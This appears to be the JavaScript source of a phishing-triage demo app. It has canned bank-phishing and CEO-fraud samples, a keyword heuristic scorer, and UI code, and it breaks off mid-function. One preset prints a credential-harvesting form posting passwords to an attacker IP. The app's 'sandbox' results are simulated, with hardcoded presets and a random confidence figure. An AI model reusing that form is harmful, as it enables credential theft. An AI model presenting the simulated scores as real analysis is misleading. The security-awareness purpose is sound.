// app.js - TriagBot Orchestrator & Multi-Axis Engine
// Self-contained, zero-dependency architecture compatible with file://, HTTP servers, and FastAPI backends.

/* ==========================================================================
   1. DATA PRESETS
   ========================================================================== */
const DEMO_PRESETS = {
  bankLogin: {
    id: "bank-login-preset",
    name: "Spoofed Bank Login",
    badge: "Phishing Threat",
    icon: "shield-alert",
    sampleInput: `URGENT SECURITY ALERT: We detected unauthorized login attempts to your Chase Online Banking account from IP 185.220.101.5 (Moscow, RU).

Your account has been temporarily restricted to prevent fraudulent transfers. You must verify your identity within 2 hours or your access will be permanently suspended.

Verify your account immediately: https://chase-security-verify.net/auth/login?session=93849102849

Department of Fraud Prevention & Risk Mitigation
JPMorgan Chase & Co.`,
    analysis: {
      risk: "dangerous",
      riskScore: 92,
      technicalScore: 88,
      psychologicalScore: 96,
      threatType: "Credential Phishing (Brand Impersonation)",
      confidence: 97,
      explanation: "This message mimics an authentic Chase Bank security alert. It leverages extreme artificial urgency ('2-hour deadline') and fear of financial loss to coerce you into entering banking credentials on a newly registered lookalike domain.",
      recommendedAction: {
        label: "DO NOT CLICK OR SUBMIT CREDENTIALS",
        level: "danger",
        description: "Do not click the link or provide any information. Open your banking mobile app directly or navigate manually to the official bank URL."
      },
      technicalSignals: [
        {
          id: "tech-1",
          name: "Domain Impersonation & Typosquatting",
          status: "danger",
          score: 94,
          detail: "Target domain 'chase-security-verify.net' was registered 48 hours ago via anonymized registrar. It is NOT affiliated with JPMorgan Chase (chase.com).",
          tag: "Domain Spoof"
        },
        {
          id: "tech-2",
          name: "Credential Harvesting Form Handler",
          status: "danger",
          score: 91,
          detail: "Isolated sandbox detected an unencrypted POST action routing username/password inputs to an unverified off-shore IP (194.26.29.112).",
          tag: "Exfiltration"
        },
        {
          id: "tech-3",
          name: "SSL & Identity Mismatch",
          status: "warning",
          score: 79,
          detail: "Domain uses automated free domain-validation SSL with no Organization Validation (OV/EV) certificate backing legitimate financial institutions.",
          tag: "Cert Anomaly"
        },
        {
          id: "tech-4",
          name: "Obfuscated Query Tracking",
          status: "danger",
          score: 88,
          detail: "Session token parameter is base64-encoded to track email recipient click-through rates.",
          tag: "Telemetry Tracking"
        }
      ],
      psychologicalSignals: [
        {
          id: "psych-1",
          name: "Artificial Countdown Urgency",
          status: "danger",
          score: 98,
          detail: "Imposes a strict '2 hours' countdown designed to induce cognitive rush and suppress critical verification.",
          tag: "Urgency Vector"
        },
        {
          id: "psych-2",
          name: "Fear & Financial Loss Aversion",
          status: "danger",
          score: 95,
          detail: "Threatens 'permanent account suspension' and 'fraudulent transfers' to trigger panic-driven compliance.",
          tag: "Fear Appeal"
        },
        {
          id: "psych-3",
          name: "Authority & Institutional Spoofing",
          status: "danger",
          score: 94,
          detail: "Employs corporate jargon ('Department of Fraud Prevention & Risk Mitigation') to create illusory institutional authority.",
          tag: "Authority Bias"
        },
        {
          id: "psych-4",
          name: "Coercive Friction Reduction",
          status: "warning",
          score: 87,
          detail: "Presents a direct one-click link as the 'only immediate remedy' to bypass out-of-band verification.",
          tag: "Bypass Lure"
        }
      ],
      preview: {
        url: "https://chase-security-verify.net/auth/login?session=93849102849",
        pageTitle: "Chase Online - Account Verification & Unlock",
        domainAge: "2 Days Old",
        sslIssuer: "Free DV Authority",
        ipLocation: "Frankfurt, DE (Proxy)",
        screenshotType: "bank_phish",
        highlightedElements: [
          { label: "Spoofed Chase Logo & Header", type: "impersonation", top: "18%", left: "35%" },
          { label: "Malicious Credential Capture Form", type: "threat", top: "45%", left: "30%" },
          { label: "Deceptive '2h Countdown' Warning Banner", type: "urgency", top: "32%", left: "20%" }
        ],
        rawDomSnippet: `<!-- Sandboxed Zero-Execution DOM Snapshot -->
<div class="phish-container bg-navy">
  <img src="/fake-assets/chase-logo.svg" alt="Chase Official" />
  <div class="alert-banner">ACCOUNT SUSPENDED - 01:59:42 REMAINING</div>
  <form action="http://194.26.29.112:8080/collect.php" method="POST">
    <input type="text" name="usr_id" placeholder="Username / Access ID" />
    <input type="password" name="pwd_id" placeholder="Password" />
    <button type="submit">Verify & Restore Account</button>
  </form>
</div>`
      },
      smartSafeReply: {
        category: "Corporate De-escalation & Verification",
        text: "Thank you for the notification. In accordance with standard security protocol, I will not access my account via provided external links. I am verifying my account status directly via the official Chase mobile banking app and verified customer service hotline."
      },
      microLesson: {
        title: "The Lookalike Domain & Countdown Trap",
        summary: "Legitimate financial institutions NEVER enforce a 2-hour countdown via email or direct you to domains containing hyphenated add-ons like 'chase-security-verify.net'. Always open your browser and manually navigate to the known, trusted domain."
      }
    }
  },

  ceoScam: {
    id: "ceo-scam-preset",
    name: "Urgent CEO Scam",
    badge: "Social Engineering",
    icon: "alert-triangle",
    sampleInput: `From: David Sterling <david.sterling.exec-office@gmail.com>
To: finance-team@company.internal
Subject: URGENT & CONFIDENTIAL: Acquisition deposit needed before 3:00 PM

Hey team,

I'm currently locked in an off-site board meeting with prospective investors and cannot take phone calls right now. 

We are finalizing a confidential strategic acquisition and need an immediate escrow deposit of $48,500 wired to our intermediary counsel before 3:00 PM today to secure exclusivity.

Please execute this wire immediately using the attached routing instructions. Treat this with utmost discretion — do not discuss this on Slack or public channels as this is strictly NDA-bound.

Send me the wire confirmation receipt as soon as it's processed.

Best,
David Sterling
Chief Executive Officer`,
    analysis: {
      risk: "dangerous",
      riskScore: 89,
      technicalScore: 74,
      psychologicalScore: 98,
      threatType: "Business Email Compromise (BEC / CEO Fraud)",
      confidence: 95,
      explanation: "Classic Business Email Compromise (BEC). The attacker impersonates the CEO using a lookalike personal Gmail address, claims an inability to take phone calls, and creates high-stakes confidential urgency to bypass standard dual-authorization wire transfer procedures.",
      recommendedAction: {
        label: "HOLD WIRE & VERIFY OUT-OF-BAND",
        level: "danger",
        description: "Do not execute the wire transfer. Contact the executive via known internal voice channel or in-person verification before taking any financial action."
      },
      technicalSignals: [
        {
          id: "tech-1",
          name: "Display Name Spoofing & Free Mail Provider",
          status: "danger",
          score: 95,
          detail: "Sender uses CEO display name 'David Sterling' with public address '@gmail.com' rather than the verified enterprise domain '@company.internal'.",
          tag: "Header Mismatch"
        },
        {
          id: "tech-2",
          name: "Missing SPF / DKIM Enterprise Signature",
          status: "danger",
          score: 82,
          detail: "Email fails corporate SPF/DMARC alignment check for internal executive communications.",
          tag: "Auth Failure"
        },
        {
          id: "tech-3",
          name: "Wire Route Risk Indicators",
          status: "warning",
          score: 78,
          detail: "Routing instructions correspond to a high-turnover fintech intermediary account frequently linked to rapid fund dispersion.",
          tag: "Mule Account"
        }
      ],
      psychologicalSignals: [
        {
          id: "psych-1",
          name: "Extreme Executive Authority Pressure",
          status: "danger",
          score: 99,
          detail: "Impersonates highest internal authority (CEO) to pressure subordinates into immediate compliance.",
          tag: "Authority Weaponization"
        },
        {
          id: "psych-2",
          name: "Channel Isolation (Communication Severing)",
          status: "danger",
          score: 97,
          detail: "Explicitly prohibits phone calls ('locked in meeting') and team discussion ('strictly confidential NDA') to prevent dual-verification.",
          tag: "Isolation Tactic"
        },
        {
          id: "psych-3",
          name: "Time-Sensitive Acquisition Pressure",
          status: "danger",
          score: 95,
          detail: "Sets an artificial deadline ('before 3:00 PM today to secure exclusivity') to induce stress and rushed execution.",
          tag: "Deadline Pressure"
        },
        {
          id: "psych-4",
          name: "Compliance Flattery & Trust Exploitation",
          status: "warning",
          score: 86,
          detail: "Frames obedience as loyalty to a high-value confidential company milestone.",
          tag: "Social Norm Manipulation"
        }
      ],
      preview: {
        url: "email://inbox/msg-8492019-confidential",
        pageTitle: "Executive Mail Gateway - Message Inspection",
        domainAge: "Gmail (Free Webmail)",
        sslIssuer: "Google TLS (External Origin)",
        ipLocation: "Lagos, NG (Originating IP)",
        screenshotType: "bec_email",
        highlightedElements: [
          { label: "Spoofed Executive Display Name (External @gmail.com)", type: "threat", top: "16%", left: "24%" },
          { label: "Mandated Isolation ('Do not call or discuss on Slack')", type: "urgency", top: "42%", left: "20%" },
          { label: "High-Value Unauthorized Wire Demand ($48,500)", type: "threat", top: "58%", left: "20%" }
        ],
        rawDomSnippet: `<!-- Sandboxed Zero-Execution Email Payload -->
<div class="mail-headers">
  <span class="header-from">From: "David Sterling" &lt;david.sterling.exec-office@gmail.com&gt;</span>
  <span class="header-auth status-fail">DMARC: FAIL (Domain Mismatch)</span>
  <span class="header-route">Origin: 102.89.44.12 (External Public ASN)</span>
</div>
<div class="mail-body">
  <p>I'm currently locked in an off-site meeting... Need $48,500 wired before 3:00 PM...</p>
</div>`
      },
      smartSafeReply: {
        category: "Corporate Dual-Authorization Challenge",
        text: "Hi David. In compliance with corporate treasury policy SEC-04, all wire disbursements exceeding $10,000 require verbal voice verification and dual sign-off from the CFO. I have initiated the verification workflow and will await secondary authentication before processing."
      },
      microLesson: {
        title: "The 'Executive in a Meeting' Isolation Play",
        summary: "Attackers frequently claim they 'cannot take phone calls' to intentionally cut off your ability to verify. Whenever an executive requests financial transfers or gift cards with secrecy, ALWAYS verify verbally on a known number before taking action."
      }
    }
  },

  cleanRepo: {
    id: "clean-repo-preset",
    name: "Clean Repo (Safe)",
    badge: "Verified Clean",
    icon: "check-circle",
    sampleInput: `https://github.com/torvalds/linux/commit/8032752e636511a0179a957813a30a112ec4a87a

Linux kernel source repository commit by Linus Torvalds.
Verified commit signature with trusted GPG key.
No suspicious redirect chains, zero obfuscated payloads, clean reputation across 40+ security threat feeds.`,
    analysis: {
      risk: "safe",
      riskScore: 6,
      technicalScore: 4,
      psychologicalScore: 8,
      threatType: "Legitimate Verified Asset",
      confidence: 99,
      explanation: "No technical anomalies or social engineering tactics detected. The URL resolves to the authentic GitHub domain with valid Extended Validation certificate, authentic GPG commit signing, and clean global reputation.",
      recommendedAction: {
        label: "SAFE TO CONTINUE",
        level: "safe",
        description: "The content and destination are verified as legitimate. Standard browsing is safe."
      },
      technicalSignals: [
        {
          id: "tech-1",
          name: "Domain Reputation & Ownership",
          status: "safe",
          score: 2,
          detail: "Authentic 'github.com' owned by Microsoft Corporation. High trust domain with 15+ years established history.",
          tag: "Verified Domain"
        },
        {
          id: "tech-2",
          name: "TLS / Cryptographic Validation",
          status: "safe",
          score: 1,
          detail: "Valid TLS 1.3 certificate issued by DigiCert with full HSTS preloading enabled.",
          tag: "Strict TLS"
        },
        {
          id: "tech-3",
          name: "Cryptographic Commit Signature",
          status: "safe",
          score: 3,
          detail: "Commit signed with verified GPG fingerprint recognized in kernel developer web of trust.",
          tag: "Signed GPG"
        },
        {
          id: "tech-4",
          name: "Reputation & Blacklist Check",
          status: "safe",
          score: 0,
          detail: "Clean status across VirusTotal, Google Safe Browsing, and Cisco Talos intelligence feeds.",
          tag: "0 Detections"
        }
      ],
      psychologicalSignals: [
        {
          id: "psych-1",
          name: "No Artificial Urgency",
          status: "safe",
          score: 5,
          detail: "Text contains zero coercive time limits, deadlines, or urgency markers.",
          tag: "Objective Text"
        },
        {
          id: "psych-2",
          name: "No Fear or Loss Coercion",
          status: "safe",
          score: 4,
          detail: "No intimidation, punitive threats, or account lockout warnings detected.",
          tag: "No Threat Vectors"
        },
        {
          id: "psych-3",
          name: "Transparent Provenance",
          status: "safe",
          score: 8,
          detail: "Context matches authentic open-source development documentation without disguised intent.",
          tag: "Transparent"
        }
      ],
      preview: {
        url: "https://github.com/torvalds/linux/commit/8032752e6365",
        pageTitle: "torvalds/linux: Kernel mainline source - GitHub",
        domainAge: "16+ Years",
        sslIssuer: "DigiCert TLS RSA SHA256",
        ipLocation: "San Francisco, US (GitHub Fastly CDN)",
        screenshotType: "github_clean",
        highlightedElements: [
          { label: "Verified GPG Cryptographic Signature", type: "safe", top: "25%", left: "32%" },
          { label: "Trusted Official GitHub Infrastructure", type: "safe", top: "12%", left: "15%" },
          { label: "Open Source Code Diff (No Malicious Shellcode)", type: "safe", top: "50%", left: "20%" }
        ],
        rawDomSnippet: `<!-- Verified Safe Repository Snapshot -->
<div class="repo-header">
  <span class="badge verified">Verified GPG Signature</span>
  <span class="commit-author">Linus Torvalds &lt;torvalds@kernel.org&gt;</span>
</div>
<div class="diff-view">
  <pre>diff --git a/kernel/sched/core.c b/kernel/sched/core.c</pre>
</div>`
      },
      smartSafeReply: {
        category: "Standard Technical Communication",
        text: "This resource has been verified clean by TriagBot. You can safely inspect and proceed with standard developer workflows."
      },
      microLesson: {
        title: "Cryptographic Signatures in Software Supply Chains",
        summary: "Verified GPG signatures ensure that code commits truly originate from the stated author and have not been tampered with in transit. Checking commit verification badges is a best practice when auditing open-source dependencies."
      }
    }
  }
};

/* ==========================================================================
   2. ANALYSIS ENGINE & API
   ========================================================================== */
const API_CONFIG = {
  USE_LIVE_BACKEND: false,
  BACKEND_BASE_URL: 'http://localhost:8000',
  CLIENT_VERSION: '1.4.0-hackathon-gold'
};

async function analyzeThreat(input) {
  // Simulate rapid sandbox execution delay
  await new Promise((resolve) => setTimeout(resolve, 800));

  if (!input || !input.trim()) {
    throw new Error("No payload provided for analysis");
  }

  const normalized = input.trim().toLowerCase();

  // Preset matchers
  if (normalized.includes("chase-security-verify") || normalized.includes("unauthorized login") || normalized.includes("jpmorgan chase")) {
    return DEMO_PRESETS.bankLogin.analysis;
  }
  if (normalized.includes("david sterling") || normalized.includes("acquisition deposit") || normalized.includes("wire confirmation") || normalized.includes("48,500")) {
    return DEMO_PRESETS.ceoScam.analysis;
  }
  if (normalized.includes("torvalds/linux") || normalized.includes("github.com/torvalds") || normalized.includes("gpg key") || normalized.includes("kernel.org")) {
    return DEMO_PRESETS.cleanRepo.analysis;
  }

  // Dynamic heuristics for custom user inputs
  return runDynamicHeuristicEngine(input);
}

function runDynamicHeuristicEngine(input) {
  const text = input.toLowerCase();
  
  const urgencyKeywords = ["urgent", "immediately", "immediate", "within 24h", "2 hours", "account locked", "suspended", "action required", "expiring", "final notice", "asap", "discreet"];
  const fearKeywords = ["unauthorized", "fraud", "police", "arrest", "lawsuit", "penalty", "compromised", "breach", "frozen", "illegal"];
  const authorityKeywords = ["ceo", "director", "fbi", "irs", "fraud prevention", "security team", "it helpdesk", "microsoft support", "bank of america", "paypal", "apple id", "dhl", "fedex"];
  const financialKeywords = ["wire", "gift card", "crypto", "bitcoin", "eth", "escrow", "invoice", "deposit", "routing number", "$", "transfer", "refund", "claim prize"];

  const urlRegex = /(https?:\/\/[^\s]+)/g;
  const foundUrls = input.match(urlRegex) || [];
  const suspiciousTlds = [".xyz", ".top", ".buzz", ".work", ".click", ".link", ".cc", ".su", ".gq", ".ml", ".cf", ".tk", ".zip", ".mov"];
  const credentialTerms = ["password", "login", "signin", "verify", "authenticate", "credential", "seed phrase", "private key", "ssn", "otp", "2fa code"];

  let psychScore = 20;
  let techScore = 15;
  const psychSignals = [];
  const techSignals = [];

  const matchedUrgency = urgencyKeywords.filter(k => text.includes(k));
  if (matchedUrgency.length > 0) {
    psychScore += Math.min(35, matchedUrgency.length * 15);
    psychSignals.push({
      id: "p-urgency",
      name: "Coercive Time Pressure",
      status: matchedUrgency.length > 1 ? "danger" : "warning",
      score: Math.min(98, 65 + matchedUrgency.length * 12),
      detail: `Detected aggressive temporal stress markers: "${matchedUrgency.slice(0, 3).join('", "')}". Intended to bypass rational scrutiny.`,
      tag: "Urgency Vector"
    });
  }

  const matchedFear = fearKeywords.filter(k => text.includes(k));
  if (matchedFear.length > 0) {
    psychScore += Math.min(30, matchedFear.length * 14);
    psychSignals.push({
      id: "p-fear",
      name: "Fear & Loss Aversion Manipulation",
      status: "danger",
      score: Math.min(96, 70 + matchedFear.length * 10),
      detail: `Detected intimidation / penalty cues: "${matchedFear.slice(0, 3).join('", "')}". Coerces reflexive action.`,
      tag: "Fear Vector"
    });
  }

  const matchedAuthority = authorityKeywords.filter(k => text.includes(k));
  if (matchedAuthority.length > 0) {
    psychScore += Math.min(25, matchedAuthority.length * 12);
    psychSignals.push({
      id: "p-authority",
      name: "Institutional Authority Spoofing",
      status: "warning",
      score: Math.min(94, 60 + matchedAuthority.length * 12),
      detail: `References high-trust entity: "${matchedAuthority.slice(0, 2).join('", "')}". Exploits hierarchy bias.`,
      tag: "Authority Bias"
    });
  }

  const matchedFinancial = financialKeywords.filter(k => text.includes(k));
  if (matchedFinancial.length > 0) {
    psychScore += 20;
    psychSignals.push({
      id: "p-financial",
      name: "Unsolicited Financial / Asset Action",
      status: "danger",
      score: 88,
      detail: `Contains prompts for monetary dispatch or gift cards: "${matchedFinancial.slice(0, 2).join('", "')}".`,
      tag: "Financial Vector"
    });
  }

  if (foundUrls.length > 0) {
    techScore += 30;
    const urlStr = foundUrls[0];
    const hasSuspiciousTld = suspiciousTlds.some(tld => urlStr.toLowerCase().includes(tld));
    const hasIpUrl = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/.test(urlStr);
    const hasAtSymbol = urlStr.includes("@");
    const hasLookalike = urlStr.includes("-security") || urlStr.includes("-login") || urlStr.includes("-verify") || urlStr.includes("support-");

    if (hasSuspiciousTld || hasIpUrl || hasAtSymbol || hasLookalike) {
      techScore += 45;
      techSignals.push({
        id: "t-domain",
        name: "High-Risk Domain Architecture",
        status: "danger",
        score: 95,
        detail: `Suspicious destination URL detected (${urlStr.slice(0, 38)}...). Exhibits indicators of lookalike redirection or non-standard TLD.`,
        tag: "Domain Anomaly"
      });
    } else {
      techSignals.push({
        id: "t-url",
        name: "External Resource Inspection",
        status: "warning",
        score: 55,
        detail: `Extracted domain "${urlStr.slice(0, 32)}" for isolated sandbox inspection.`,
        tag: "Network Endpoint"
      });
    }
  }

  const matchedCreds = credentialTerms.filter(k => text.includes(k));
  if (matchedCreds.length > 0) {
    techScore += 35;
    techSignals.push({
      id: "t-creds",
      name: "Authentication Capture Intent",
      status: "danger",
      score: 92,
      detail: `Contains explicit solicitation of sensitive credentials/tokens (${matchedCreds.slice(0, 3).join(', ')}).`,
      tag: "Credential Harvest"
    });
  }

  psychScore = Math.min(99, Math.max(5, psychScore));
  techScore = Math.min(99, Math.max(5, techScore));
  const overallRiskScore = Math.round((techScore * 0.55) + (psychScore * 0.45));

  let risk = "safe";
  let threatType = "Low Risk Payload";
  let recAction = { label: "SAFE TO PROCEED", level: "safe", description: "Standard precautions apply. No overt malicious indicators found." };
  let explanation = "The analyzed content exhibits low indicators of manipulation or anomalous infrastructure.";

  if (overallRiskScore >= 70) {
    risk = "dangerous";
    threatType = (techScore > psychScore) ? "Deceptive Phishing / Malicious Link" : "Social Engineering / Manipulation Attack";
    recAction = {
      label: "DO NOT INTERACT / BLOCK SENDER",
      level: "danger",
      description: "Severe threat indicators detected. Do not click links, open attachments, or reply."
    };
    explanation = `High-confidence threat detected. The input combines ${techSignals.length ? 'suspicious infrastructure patterns' : 'unverified links'} with coercive psychological triggers (${psychSignals.map(s => s.name).slice(0, 2).join(' & ')}).`;
  } else if (overallRiskScore >= 40) {
    risk = "suspicious";
    threatType = "Suspicious Content / Potential Phishing";
    recAction = {
      label: "PROCEED WITH CAUTION / VERIFY OUT-OF-BAND",
      level: "warning",
      description: "Moderate anomaly signals detected. Verify the sender's identity through trusted separate channels."
    };
    explanation = "This input contains anomalous patterns that warrant extra verification before any action is taken.";
  }

  if (techSignals.length === 0) {
    techSignals.push({
      id: "t-clean",
      name: "Network & Payload Signature",
      status: "safe",
      score: 10,
      detail: "No active exploitation markers, zero-day signatures, or suspicious redirection vectors found.",
      tag: "Clean Signature"
    });
  }
  if (psychSignals.length === 0) {
    psychSignals.push({
      id: "p-clean",
      name: "Tone & Behavioral Neutrality",
      status: "safe",
      score: 8,
      detail: "No coercive language, artificial deadlines, or intimidation tactics identified.",
      tag: "Neutral Vector"
    });
  }

  const sampleUrl = foundUrls[0] || (input.length > 50 ? "payload://raw-message/inspect" : "https://unverified-sample-host.net");

  return {
    risk,
    riskScore: overallRiskScore,
    technicalScore: techScore,
    psychologicalScore: psychScore,
    threatType,
    confidence: Math.min(99, Math.max(78, 80 + Math.floor(Math.random() * 18))),
    explanation,
    recommendedAction: recAction,
    technicalSignals: techSignals,
    psychologicalSignals: psychSignals,
    preview: {
      url: sampleUrl,
      pageTitle: `Isolated Inspection: ${sampleUrl.slice(0, 32)}`,
      domainAge: risk === "dangerous" ? "Under 7 Days (High Risk)" : "Established",
      sslIssuer: risk === "dangerous" ? "Self-Signed / Untrusted CA" : "Standard Domain TLS",
      ipLocation: "Isolated Sandbox Container (Playwright Virtual Worker)",
      screenshotType: risk === "dangerous" ? "generic_threat" : "generic_clean",
      highlightedElements: [
        { label: "Detected Anomaly In Sandbox Viewport", type: risk === "dangerous" ? "threat" : "safe", top: "35%", left: "25%" }
      ],
      rawDomSnippet: `<!-- Sandboxed DOM Capture -->
<div class="quarantine-wrapper status-${risk}">
  <p class="summary">Content sanitized by TriagBot Zero-Execution Kernel</p>
  <pre>${escapeHtml(input.slice(0, 200))}</pre>
</div>`
    },
    smartSafeReply: {
      category: "Safe Deflection Protocol",
      text: risk === "dangerous" 
        ? "I have logged this message with our security operations team. Due to active security policies, I cannot process this request via direct link or email. Please provide official verification through our authenticated enterprise channel."
        : "Received. I will review this through standard verified communication channels."
    },
    microLesson: {
      title: "Recognizing Combined Attack Vectors",
      summary: "Modern cyber adversaries rarely rely on technical malware alone. They systematically pair malicious links with psychological triggers like urgency and authority to exploit human reflexes before defenses can react."
    }
  };
}

function exportIncidentBundle(analysisData, rawInput) {
  const exportPayload = {
    metadata: {
      generatedAt: new Date().toISOString(),
      tool: "TriagBot Triage Engine",
      version: API_CONFIG.CLIENT_VERSION,
      incidentId: `INC-${Math.random().toString(36).substring(2, 9).toUpperCase()}`
    },
    rawContentSnippet: rawInput.slice(0, 300),
    triageReport: analysisData
  };
  return JSON.stringify(exportPayload, null, 2);
}

/* ==========================================================================
   3. APPLICATION CONTROLLER
   ========================================================================== */
const STATE = {
  currentAnalysis: null,
  activePresetId: null,
  isScanning: false,
  activeSandboxTab: 'visual'
};

const DOM = {
  header: document.getElementById('main-header'),
  threatInput: document.getElementById('threat-input'),
  charCount: document.getElementById('char-count'),
  clearInputBtn: document.getElementById('clear-input-btn'),
  pasteSampleBtn: document.getElementById('paste-sample-btn'),
  analyzeBtn: document.getElementById('analyze-btn'),
  analyzeBtnText: document.getElementById('analyze-btn-text'),
  analyzeBtnIcon: document.getElementById('analyze-btn-icon'),
  scannerStatusDot: document.getElementById('scanner-status-dot'),
  scannerStatusText: document.getElementById('scanner-status-text'),
  telemetryFeed: document.getElementById('scan-telemetry-feed'),
  stepsList: document.getElementById('scan-steps-list'),
  stepTimer: document.getElementById('scan-step-timer'),
  
  // Presets
  presetBank: document.getElementById('preset-bank'),
  presetCeo: document.getElementById('preset-ceo'),
  presetClean: document.getElementById('preset-clean'),
  
  // Result Panel
  resultPanel: document.getElementById('result-panel'),
  resultCard: document.getElementById('result-card'),
  riskStatusBadge: document.getElementById('risk-status-badge'),
  riskBadgeText: document.getElementById('risk-badge-text'),
  threatTypeBadge: document.getElementById('threat-type-badge'),
  confidenceBadge: document.getElementById('confidence-badge'),
  resultMainTitle: document.getElementById('result-main-title'),
  animatedRiskScore: document.getElementById('animated-risk-score'),
  riskMeterIcon: document.getElementById('risk-meter-icon'),
  
  // Dual-Axis
  techScoreNum: document.getElementById('tech-score-num'),
  techScoreBar: document.getElementById('tech-score-bar'),
  techSignalsList: document.getElementById('tech-signals-list'),
  psychScoreNum: document.getElementById('psych-score-num'),
  psychScoreBar: document.getElementById('psych-score-bar'),
  psychSignalsList: document.getElementById('psych-signals-list'),
  
  // Safe Glass
  tabVisual: document.getElementById('tab-visual-preview'),
  tabDom: document.getElementById('tab-dom-inspector'),
  sandboxUrlText: document.getElementById('sandbox-url-text'),
  sandboxUrlIcon: document.getElementById('sandbox-url-icon'),
  sandboxSslBadge: document.getElementById('sandbox-ssl-badge'),
  sandboxVisualViewport: document.getElementById('sandbox-visual-viewport'),
  sandboxDomViewport: document.getElementById('sandbox-dom-viewport'),
  sandboxMockRender: document.getElementById('sandbox-mock-render'),
  sandboxRawDom: document.getElementById('sandbox-raw-dom'),
  
  // Explanation & Action
  plainExplanationText: document.getElementById('plain-explanation-text'),
  recActionBox: document.getElementById('recommended-action-box'),
  recActionIcon: document.getElementById('rec-action-icon'),
  recActionLabel: document.getElementById('rec-action-label'),
  recActionTitle: document.getElementById('rec-action-title'),
  recActionDesc: document.getElementById('rec-action-desc'),
  smartSafeReplyBox: document.getElementById('smart-safe-reply-box'),
  copySafeReplyBtn: document.getElementById('copy-safe-reply-btn'),
  copyReplyText: document.getElementById('copy-reply-text'),
  microLessonTitle: document.getElementById('micro-lesson-title'),
  microLessonDesc: document.getElementById('micro-lesson-desc'),
  exportJsonBtn: document.getElementById('export-json-btn'),
  newScanBtn: document.getElementById('new-scan-btn'),
  
  // Toast & Canvas
  toast: document.getElementById('cyber-toast'),
  toastMessage: document.getElementById('toast-message'),
  canvas: document.getElementById('cyber-canvas')
};

document.addEventListener('DOMContentLoaded', () => {
  initCyberCanvas();
  initLucideIcons();
  setupEventListeners();
  setupPresetTriggers();
  
  // Pre-load Spoofed Bank scenario for immediate rich presentation
  setTimeout(() => {
    selectPreset('bankLogin');
  }, 400);
});

function initLucideIcons() {
  if (window.lucide && typeof window.lucide.createIcons === 'function') {
    window.lucide.createIcons();
  }
}

function setupEventListeners() {
  DOM.threatInput.addEventListener('input', handleInputChange);
  DOM.clearInputBtn.addEventListener('click', clearInput);
  DOM.pasteSampleBtn.addEventListener('click', () => {
    DOM.threatInput.value = "https://secure-login-verify-auth2.net/update?auth_token=84029148";
    handleInputChange();
    executeScan();
  });

  DOM.analyzeBtn.addEventListener('click', () => executeScan());

  DOM.threatInput.addEventListener('keydown', (e) => {
    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
      e.preventDefault();
      executeScan();
    }
  });

  DOM.tabVisual.addEventListener('click', () => switchSandboxTab('visual'));
  DOM.tabDom.addEventListener('click', () => switchSandboxTab('dom'));

  DOM.copySafeReplyBtn.addEventListener('click', copySmartReply);
  DOM.exportJsonBtn.addEventListener('click', exportJsonIncident);

  DOM.newScanBtn.addEventListener('click', () => {
    DOM.threatInput.value = '';
    handleInputChange();
    DOM.threatInput.focus();
    DOM.threatInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
  });

  window.addEventListener('scroll', () => {
    if (window.scrollY > 20) {
      DOM.header.classList.add('shadow-[0_10px_30px_rgba(0,0,0,0.8)]', 'bg-[#0B0F19]/95');
    } else {
      DOM.header.classList.remove('shadow-[0_10px_30px_rgba(0,0,0,0.8)]', 'bg-[#0B0F19]/95');
    }
  });
}

function setupPresetTriggers() {
  DOM.presetBank.addEventListener('click', () => selectPreset('bankLogin'));
  DOM.presetCeo.addEventListener('click', () => selectPreset('ceoScam'));
  DOM.presetClean.addEventListener('click', () => selectPreset('cleanRepo'));
}

function selectPreset(presetKey) {
  const preset = DEMO_PRESETS[presetKey];
  if (!preset) return;

  STATE.activePresetId = presetKey;
  DOM.threatInput.value = preset.sampleInput;
  handleInputChange();

  [DOM.presetBank, DOM.presetCeo, DOM.presetClean].forEach(btn => {
    btn.classList.remove('ring-2', 'ring-cyan-400', 'bg-slate-800');
  });

  if (presetKey === 'bankLogin') DOM.presetBank.classList.add('ring-2', 'ring-cyan-400', 'bg-slate-800');
  if (presetKey === 'ceoScam') DOM.presetCeo.classList.add('ring-2', 'ring-cyan-400', 'bg-slate-800');
  if (presetKey === 'cleanRepo') DOM.presetClean.classList.add('ring-2', 'ring-cyan-400', 'bg-slate-800');

  executeScan();
}

function handleInputChange() {
  const len = DOM.threatInput.value.length;
  DOM.charCount.textContent = `${len.toLocaleString()} character${len === 1 ? '' : 's'}`;
}

function clearInput() {
  DOM.threatInput.value = '';
  handleInputChange();
  DOM.threatInput.focus();
}

async function executeScan() {
  const input = DOM.threatInput.value.trim();
  if (!input) {
    showToast("Please enter a suspicious URL, email, or message first.");
    DOM.threatInput.focus();
    return;
  }

  if (STATE.isScanning) return;
  STATE.isScanning = true;

  setScannerLoadingState(true);
  const telemetryPromise = runTelemetrySimulation();

  try {
    const [analysisResult] = await Promise.all([
      analyzeThreat(input),
      telemetryPromise
    ]);

    STATE.currentAnalysis = analysisResult;
    renderAnalysisResult(analysisResult);
    
    DOM.resultPanel.classList.remove('hidden');
    setTimeout(() => {
      DOM.resultPanel.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }, 150);

  } catch (error) {
    console.error("Scan error:", error);
    showToast(`Analysis failed: ${error.message}`);
  } finally {
    setScannerLoadingState(false);
    STATE.isScanning = false;
  }
}

async function runTelemetrySimulation() {
  DOM.telemetryFeed.classList.remove('hidden');
  DOM.stepsList.innerHTML = '';
  
  const steps = [
    { label: "01: Ingesting payload & extracting network endpoints...", duration: 200 },
    { label: "02: Spawning isolated virtual container & AST parser...", duration: 250 },
    { label: "03: Executing dual-axis anomaly & psychological heuristic engine...", duration: 280 },
    { label: "04: Synthesizing zero-execution safe preview & deflection recommendations...", duration: 150 }
  ];

  const startTime = Date.now();
  const timerInterval = setInterval(() => {
    const currentElapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    DOM.stepTimer.textContent = `${currentElapsed}s`;
  }, 100);

  for (let i = 0; i < steps.length; i++) {
    const step = steps[i];
    const stepEl = document.createElement('div');
    stepEl.className = 'flex items-center gap-2 text-cyan-300 font-mono animate-pulse';
    stepEl.innerHTML = `
      <span class="text-cyan-400">▹</span>
      <span>${step.label}</span>
    `;
    DOM.stepsList.appendChild(stepEl);

    await new Promise(r => setTimeout(r, step.duration));
    
    stepEl.className = 'flex items-center gap-2 text-slate-400 font-mono';
    stepEl.innerHTML = `
      <span class="text-emerald-400">✓</span>
      <span>${step.label}</span>
    `;
  }

  clearInterval(timerInterval);
  DOM.stepTimer.textContent = "0.9s (Done)";
  
